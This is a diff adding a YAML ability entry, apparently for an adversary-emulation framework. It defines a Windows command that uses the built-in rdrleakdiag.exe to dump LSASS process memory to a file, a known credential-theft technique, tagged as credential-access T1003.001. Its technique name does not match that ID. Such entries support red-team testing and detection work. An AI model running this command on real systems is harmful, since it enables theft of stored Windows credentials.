@@ -1,0 +1,23 @@
+- id: b59b236a-26a0-3cfe-b5ae-9f2a4f39fc1a
+  name: rdrleakdiag.exe - Dump LSASS process by PID and create a dump file (creates
+    files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).
+  description: Dump LSASS process by PID and create a dump file (creates files called
+    `minidump_<PID>.dmp` and `results_<PID>.hlk`).
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'rdrleakdiag.exe /p 832 /o #{host.dir.temp} /fullmemdmp /wait 1'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - credential-access
+  version: '1.0'
+  author: John Dwyer
+  created: '2022-05-18'
+  modified: '2022-05-18'
+  operating_system: Windows All Versions
